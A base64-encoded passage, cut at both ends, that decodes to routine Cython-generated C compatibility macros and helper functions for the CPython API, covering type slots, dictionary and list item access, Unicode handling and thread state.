9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobSwgcywgYikgICgodm9pZCltLCBQeVR5cGVfRnJvbVNwZWNXaXRoQmFzZXMocywgYikpCiAgdHlwZWRlZiBQeU9iamVjdCAqKCpfX1B5eF9QeUNNZXRob2QpKFB5T2JqZWN0ICosIFB5VHlwZU9iamVjdCAqLCBQeU9iamVjdCAqY29uc3QgKiwgc2l6ZV90LCBQeU9iamVjdCAqKTsKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtLCBzLCBiKSAgUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKG0sIHMsIGIpCiAgI2RlZmluZSBfX1B5eF9QeUNNZXRob2QgIFB5Q01ldGhvZAojZW5kaWYKI2lmbmRlZiBNRVRIX01FVEhPRAogICNkZWZpbmUgTUVUSF9NRVRIT0QgMHgyMDAKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlPYmplY3RfTWFsbG9jKQogICNkZWZpbmUgUHlPYmplY3RfTWFsbG9jKHMpICAgUHlNZW1fTWFsbG9jKHMpCiAgI2RlZmluZSBQeU9iamVjdF9GcmVlKHApICAgICBQeU1lbV9GcmVlKHApCiAgI2RlZmluZSBQeU9iamVjdF9SZWFsbG9jKHApICBQeU1lbV9SZWFsbG9jKHApCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pCiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAjZGVmaW5lIF9fUHl4X1B5Q29kZV9IYXNGcmVlVmFycyhjbykgIChQeUNvZGVfR2V0TnVtRnJlZShjbykgPiAwKQogICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pIF9QeUZyYW1lX1NldExpbmVOdW1iZXIoKGZyYW1lKSwgKGxpbmVubykpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeUNvZGVfSGFzRnJlZVZhcnMoY28pICAoUHlDb2RlX0dldE51bUZyZWUoY28pID4gMCkKICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfU2V0TGluZU51bWJlcihmcmFtZSwgbGluZW5vKSAgKGZyYW1lKS0+Zl9saW5lbm8gPSAobGluZW5vKQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCBQeVRocmVhZFN0YXRlX0dldCgpCiNlbGlmICFDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAjZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCBQeVRocmVhZFN0YXRlX0dFVCgpCiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTEKICAjZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCBQeVRocmVhZFN0YXRlX0dldFVuY2hlY2tlZCgpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgX1B5VGhyZWFkU3RhdGVfVW5jaGVja2VkR2V0KCkKI2VuZGlmCiNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkICpfX1B5eF9fUHlNb2R1bGVfR2V0U3RhdGUoUHlPYmplY3QgKm9wKQp7CiAgICB2b2lkICpyZXN1bHQ7CiAgICByZXN1bHQgPSBQeU1vZHVsZV9HZXRTdGF0ZShvcCk7CiAgICBpZiAoIXJlc3VsdCkKICAgICAgICBQeV9GYXRhbEVycm9yKCJDb3VsZG4ndCBmaW5kIHRoZSBtb2R1bGUgc3RhdGUiKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2RlZmluZSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShvKSAoX19weXhfbXN0YXRldHlwZSAqKV9fUHl4X19QeU1vZHVsZV9HZXRTdGF0ZShvKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG9wKSAoKHZvaWQpb3AsX19weXhfbXN0YXRlX2dsb2JhbCkKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfR2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpICBfX1B5eF9QeVR5cGVfR2V0U2xvdChQeV9UWVBFKChQeU9iamVjdCAqKSBvYmopLCBuYW1lLCBmdW5jX2N0eXBlKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X1RyeUdldFNsb3Qob2JqLCBuYW1lLCBmdW5jX2N0eXBlKSBfX1B5eF9QeVR5cGVfVHJ5R2V0U2xvdChQeV9UWVBFKG9iaiksIG5hbWUsIGZ1bmNfY3R5cGUpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfR2V0U3ViU2xvdChvYmosIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QoUHlfVFlQRShvYmopLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVHJ5R2V0U3ViU2xvdChvYmosIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX1RyeUdldFN1YlNsb3QoUHlfVFlQRShvYmopLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpCiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpICAoKHR5cGUpLT5uYW1lKQogICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTdWJTbG90KHR5cGUsIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgKCgodHlwZSktPnN1YikgPyAoKHR5cGUpLT5zdWItPm5hbWUpIDogTlVMTCkKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KHR5cGUsIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QodHlwZSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkgICgoZnVuY19jdHlwZSkgUHlUeXBlX0dldFNsb3QoKHR5cGUpLCBQeV8jI25hbWUpKQogICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSlcCiAgICAoKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMCB8fFwKICAgICAoUHlUeXBlX0dldEZsYWdzKHR5cGUpICYgUHlfVFBGTEFHU19IRUFQVFlQRSkgfHwgX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbigpID49IDB4MDMwQTAwMDApID9cCiAgICAgX19QeXhfUHlUeXBlX0dldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkgOiBOVUxMKQogICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9HZXRTbG90KG9iaiwgbmFtZSwgZnVuY19jdHlwZSkKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KG9iaiwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSBfX1B5eF9QeVR5cGVfVHJ5R2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IGRlZmluZWQoX1B5RGljdF9OZXdQcmVzaXplZCkKI2RlZmluZSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQobikgICgobiA8PSA4KSA/IFB5RGljdF9OZXcoKSA6IF9QeURpY3RfTmV3UHJlc2l6ZWQobikpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKG4pICBQeURpY3RfTmV3KCkKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfRGl2aWRlKHgseSkgICAgICAgICBQeU51bWJlcl9UcnVlRGl2aWRlKHgseSkKI2RlZmluZSBfX1B5eF9QeU51bWJlcl9JblBsYWNlRGl2aWRlKHgseSkgIFB5TnVtYmVyX0luUGxhY2VUcnVlRGl2aWRlKHgseSkKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1TdHJXaXRoRXJyb3IoZGljdCwgbmFtZSkgIF9QeURpY3RfR2V0SXRlbV9Lbm93bkhhc2goZGljdCwgbmFtZSwgKChQeUFTQ0lJT2JqZWN0ICopIG5hbWUpLT5oYXNoKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyKFB5T2JqZWN0ICpkaWN0LCBQeU9iamVjdCAqbmFtZSkgewogICAgUHlPYmplY3QgKnJlcyA9IF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKGRpY3QsIG5hbWUpOwogICAgaWYgKHJlcyA9PSBOVUxMKSBQeUVycl9DbGVhcigpOwogICAgcmV0dXJuIHJlczsKfQojZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAyMDAwMAojZGVmaW5lIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yICBQeURpY3RfR2V0SXRlbVdpdGhFcnJvcgojZGVmaW5lIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyICAgICAgICAgICBQeURpY3RfR2V0SXRlbQojZWxzZQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKFB5T2JqZWN0ICpkaWN0LCBQeU9iamVjdCAqbmFtZSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICByZXR1cm4gUHlEaWN0X0dldEl0ZW0oZGljdCwgbmFtZSk7CiNlbHNlCiAgICBQeURpY3RFbnRyeSAqZXA7CiAgICBQeURpY3RPYmplY3QgKm1wID0gKFB5RGljdE9iamVjdCopIGRpY3Q7CiAgICBsb25nIGhhc2ggPSAoKFB5U3RyaW5nT2JqZWN0ICopIG5hbWUpLT5vYl9zaGFzaDsKICAgIGFzc2VydChoYXNoICE9IC0xKTsKICAgIGVwID0gKG1wLT5tYV9sb29rdXApKG1wLCBuYW1lLCBoYXNoKTsKICAgIGlmIChlcCA9PSBOVUxMKSB7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICByZXR1cm4gZXAtPm1lX3ZhbHVlOwojZW5kaWYKfQojZGVmaW5lIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyICAgICAgICAgICBQeURpY3RfR2V0SXRlbQojZW5kaWYKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldEZsYWdzKHRwKSAgICgoKFB5VHlwZU9iamVjdCAqKXRwKS0+dHBfZmxhZ3MpCiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZSh0eXBlLCBmZWF0dXJlKSAgKChfX1B5eF9QeVR5cGVfR2V0RmxhZ3ModHlwZSkgJiAoZmVhdHVyZSkpICE9IDApCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RmxhZ3ModHApICAgKFB5VHlwZV9HZXRGbGFncygoUHlUeXBlT2JqZWN0ICopdHApKQogICNkZWZpbmUgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUodHlwZSwgZmVhdHVyZSkgIFB5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIGZlYXR1cmUpCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhpdGVyYXRvcikgIF9fUHl4X1B5T2JqZWN0X0dldFNsb3QoaXRlcmF0b3IsIHRwX2l0ZXJuZXh0LCBpdGVybmV4dGZ1bmMpCiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMAojZGVmaW5lIF9fUHl4X1B5SGVhcFR5cGVPYmplY3RfR0NfRGVsKG9iaikgIHtcCiAgICBQeVR5cGVPYmplY3QgKnR5cGUgPSBQeV9UWVBFKChQeU9iamVjdCopb2JqKTtcCiAgICBhc3NlcnQoX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUodHlwZSwgUHlfVFBGTEFHU19IRUFQVFlQRSkpO1wKICAgIFB5T2JqZWN0X0dDX0RlbChvYmopO1wKICAgIFB5X0RFQ1JFRih0eXBlKTtcCn0KI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChvYmopICBQeU9iamVjdF9HQ19EZWwob2JqKQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEWShvcCkgICAgICAgKDApCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRF9DSEFSKHUsIGkpIFB5VW5pY29kZV9SZWFkQ2hhcih1LCBpKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKHUpICAgKCh2b2lkKXUsIDExMTQxMTFVKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0tJTkQodSkgICAgICAgICAoKHZvaWQpdSwgKDApKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0RBVEEodSkgICAgICAgICAoKHZvaWQqKXUpCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRChrLCBkLCBpKSAgICgodm9pZClrLCBQeVVuaWNvZGVfUmVhZENoYXIoKFB5T2JqZWN0KikoZCksIGkpKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSBQeVVuaWNvZGVfR2V0TGVuZ3RoKHUpKQojZWxzZQogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEWShvcCkgICAgICAgKDApCiAgI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURZKG9wKSAgICAgICAobGlrZWx5KFB5VW5pY29kZV9JU19SRUFEWShvcCkpID9cCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAgOiBfUHlVbmljb2RlX1JlYWR5KChQeU9iamVjdCAqKShvcCkpKQogICNlbmRpZgogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURfQ0hBUih1LCBpKSBQeVVuaWNvZGVfUkVBRF9DSEFSKHUsIGkpCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUodSkgICBQeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUodSkKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9LSU5EKHUpICAgICAgICAgKChpbnQpUHlVbmljb2RlX0tJTkQodSkpCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfREFUQSh1KSAgICAgICAgIFB5VW5pY29kZV9EQVRBKHUpCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRChrLCBkLCBpKSAgIFB5VW5pY29kZV9SRUFEKGssIGQsIGkpCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfV1JJVEUoaywgZCwgaSwgY2gpICBQeVVuaWNvZGVfV1JJVEUoaywgZCwgaSwgKFB5X1VDUzQpIGNoKQogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9JU19UUlVFKHUpICAgICAgKDAgIT0gUHlVbmljb2RlX0dFVF9MRU5HVEgodSkpCiAgI2Vsc2UKICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMAogICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfSVNfVFJVRSh1KSAgICAgICgwICE9IChsaWtlbHkoUHlVbmljb2RlX0lTX1JFQURZKHUpKSA/IFB5VW5pY29kZV9HRVRfTEVOR1RIKHUpIDogKChQeUNvbXBhY3RVbmljb2RlT2JqZWN0ICopKHUpKS0+d3N0cl9sZW5ndGgpKQogICAgI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSAobGlrZWx5KFB5VW5pY29kZV9JU19SRUFEWSh1KSkgPyBQeVVuaWNvZGVfR0VUX0xFTkdUSCh1KSA6IFB5VW5pY29kZV9HRVRfU0laRSh1KSkpCiAgICAjZW5kaWYKICAjZW5kaWYKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXQoYSwgYikgICAgICBQeU51bWJlcl9BZGQoYSwgYikKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRTYWZlKGEsIGIpICBQeU51bWJlcl9BZGQoYSwgYikKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXQoYSwgYikgICAgICBQeVVuaWNvZGVfQ29uY2F0KGEsIGIpCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0U2FmZShhLCBiKSAgKCh1bmxpa2VseSgoYSkgPT0gUHlfTm9uZSkgfHwgdW5saWtlbHkoKGIpID09IFB5X05vbmUpKSA/XAogICAgICBQeU51bWJlcl9BZGQoYSwgYikgOiBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGEsIGIpKQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICNpZiAhZGVmaW5lZChQeVVuaWNvZGVfRGVjb2RlVW5pY29kZUVzY2FwZSkKICAgICNkZWZpbmUgUHlVbmljb2RlX0RlY29kZVVuaWNvZGVFc2NhcGUocywgc2l6ZSwgZXJyb3JzKSAgUHlVbmljb2RlX0RlY29kZShzLCBzaXplLCAidW5pY29kZV9lc2NhcGUiLCBlcnJvcnMpCiAgI2VuZGlmCiAgI2lmICFkZWZpbmVkKFB5VW5pY29kZV9Db250YWlucykKICAgICNkZWZpbmUgUHlVbmljb2RlX0NvbnRhaW5zKHUsIHMpICBQeVNlcXVlbmNlX0NvbnRhaW5zKHUsIHMpCiAgI2VuZGlmCiAgI2lmICFkZWZpbmVkKFB5Qnl0ZUFycmF5X0NoZWNrKQogICAgI2RlZmluZSBQeUJ5dGVBcnJheV9DaGVjayhvYmopICBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAmUHlCeXRlQXJyYXlfVHlwZSkKICAjZW5kaWYKICAjaWYgIWRlZmluZWQoUHlPYmplY3RfRm9ybWF0KQogICAgI2RlZmluZSBQeU9iamVjdF9Gb3JtYXQob2JqLCBmbXQpICBQeU9iamVjdF9DYWxsTWV0aG9kKG9iaiwgIl9fZm9ybWF0X18iLCAiTyIsIGZtdCkKICAjZW5kaWYKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zvcm1hdFNhZmUoYSwgYikgICgodW5saWtlbHkoKGEpID09IFB5X05vbmUgfHwgKFB5VW5pY29kZV9DaGVjayhiKSAmJiAhUHlVbmljb2RlX0NoZWNrRXhhY3QoYikpKSkgPyBQeU51bWJlcl9SZW1haW5kZXIoYSwgYikgOiBQeVVuaWNvZGVfRm9ybWF0KGEsIGIpKQojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX0xpc3RLZWVwTmV3KG9iailcCiAgICAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KG9iaikgJiYgUHlfUkVGQ05UKG9iaikgPT0gMSkgPyBfX1B5eF9OZXdSZWYob2JqKSA6IFB5U2VxdWVuY2VfTGlzdChvYmopKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9MaXN0S2VlcE5ldyhvYmopICBQeVNlcXVlbmNlX0xpc3Qob2JqKQojZW5kaWYKI2lmbmRlZiBQeVNldF9DaGVja0V4YWN0CiAgI2RlZmluZSBQeVNldF9DaGVja0V4YWN0KG9iaikgICAgICAgIF9fUHl4X0lTX1RZUEUob2JqLCAmUHlTZXRfVHlwZSkKI2VuZGlmCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMEE0CiAgI2RlZmluZSBfX1B5eF9TRVRfUkVGQ05UKG9iaiwgcmVmY250KSBQeV9TRVRfUkVGQ05UKG9iaiwgcmVmY250KQogICNkZWZpbmUgX19QeXhfU0VUX1NJWkUob2JqLCBzaXplKSBQeV9TRVRfU0laRShvYmosIHNpemUpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9TRVRfUkVGQ05UKG9iaiwgcmVmY250KSBQeV9SRUZDTlQob2JqKSA9IChyZWZjbnQpCiAgI2RlZmluZSBfX1B5eF9TRVRfU0laRShvYmosIHNpemUpIFB5X1NJWkUob2JqKSA9IChzaXplKQojZW5kaWYKI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIHx8IENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMKICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIFB5TGlzdF9HZXRJdGVtUmVmKG8sIGkpCiAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSAobGlrZWx5KChpKSA+PSAwKSA/IFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKSA6IChQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW5kZXhFcnJvciwgImxpc3QgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkpCiAgI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgUHlTZXF1ZW5jZV9JVEVNKG8sIGkpCiAgI2VuZGlmCiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIFB5TGlzdF9HZXRJdGVtUmVmKG8sIGkpCiAgI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgX19QeXhfWE5ld1JlZihQeUxpc3RfR2V0SXRlbShvLCBpKSkKICAjZW5kaWYKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIF9fUHl4X05ld1JlZihQeUxpc3RfR0VUX0lURU0obywgaSkpCiNlbmRpZgojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoZGljdCwga2V5LCByZXN1bHQpIFB5RGljdF9HZXRJdGVtUmVmKGRpY3QsIGtleSwgcmVzdWx0KQojZWxpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKipyZXN1bHQpIHsKICAqcmVzdWx0ID0gUHlPYmplY3RfR2V0SXRlbShkaWN0LCBrZXkpOwogIGlmICgqcmVzdWx0ID09IE5VTEwpIHsKICAgIGlmIChQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0tleUVycm9yKSkgewogICAgICBQeUVycl9DbGVhcigpOwogICAgICByZXR1cm4gMDsKICAgIH0KICAgIHJldHVybiAtMTsKICB9CiAgcmV0dXJuIDE7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RGljdF9HZXRJdGVtUmVmKFB5T2JqZWN0ICpkaWN0LCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqKnJlc3VsdCkgewogICpyZXN1bHQgPSBQeURpY3RfR2V0SXRlbVdpdGhFcnJvcihkaWN0LCBrZXkpOwogIGlmICgqcmVzdWx0ID09IE5VTEwpIHsKICAgIHJldHVybiBQeUVycl9PY2N1cnJlZCgpID8gLTEgOiAwOwogIH0KICBQeV9JTkNSRUYoKnJlc3VsdCk7CiAgcmV0dXJuIDE7Cn0KI2VuZGlmCiNpZiBkZWZpbmVkKENZVEhPTl9ERUJVR19WSVNJVF9DT05TVCkgJiYgQ1lUSE9OX0RFQlVHX1ZJU0lUX0NPTlNUCiAgI2RlZmluZSBfX1B5eF9WSVNJVF9DT05TVChvYmopICBQeV9WSVNJVChvYmopCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9WSVNJVF9DT05TVChvYmopCiNlbmRpZgojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKG8sIGkpIFB5U2VxdWVuY2VfSVRFTShvLCBpKQogICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcSkgIFB5X1NJWkUoc2VxKQogICNkZWZpbmUgX19QeXhfUHlUdXBsZV9TRVRfSVRFTShvLCBpLCB2KSAoUHlUdXBsZV9TRVRfSVRFTShvLCBpLCB2KSwgKDApKQogICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfSVRFTShvLCBpKSBQeVR1cGxlX0dFVF9JVEVNKG8sIGkpCiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfU0VUX0lURU0obywgaSwgdikgKFB5TGlzdF9TRVRfSVRFTShvLCBpLCB2KSwgKDApKQogICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9JVEVNKG8sIGkpIFB5TGlzdF9HRVRfSVRFTShvLCBpKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKG8sIGkpIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKQogICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcSkgIFB5U2VxdWVuY2VfU2l6ZShzZXEpCiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKG8sIGksIHYpIFB5VHVwbGVfU2V0SXRlbShvLCBpLCB2KQogICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfSVRFTShvLCBpKSBQeVR1cGxlX0dldEl0ZW0obywgaSkKICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9TRVRfSVRFTShvLCBpLCB2KSBQeUxpc3RfU2V0SXRlbShvLCBpLCB2KQogICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9JVEVNKG8sIGkpIFB5TGlzdF9HZXRJdGVtKG8sIGkpCiNlbmRpZgojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUobykgUHlUdXBsZV9HRVRfU0laRShvKQogICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9TSVpFKG8pIFB5TGlzdF9HRVRfU0laRShvKQogICNkZWZpbmUgX19QeXhfUHlTZXRfR0VUX1NJWkUobykgUHlTZXRfR0VUX1NJWkUobykKICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfR0VUX1NJWkUobykgUHlCeXRlc19HRVRfU0laR